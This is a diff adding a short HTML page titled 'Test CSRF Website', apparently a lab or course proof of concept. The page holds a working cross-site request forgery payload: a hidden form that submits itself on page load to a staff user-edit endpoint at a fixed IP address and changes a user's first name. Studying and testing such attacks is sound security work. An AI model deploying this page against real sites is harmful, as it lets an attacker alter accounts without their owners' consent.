@@ -1,0 +1,10 @@
+<html>
+  <head>
+    <title>Test CSRF Website</title>
+  </head>
+  <body onload="document.edit_form.submit()">
+    <form action="https://104.154.236.9/red/public/staff/users/edit.php?id=1" method="POST" style="display: none; visibility: hidden;" name="edit_form">
+      <input type="hidden" name="first_name" value="James" />
+    </form>
+  </body>
+</html>
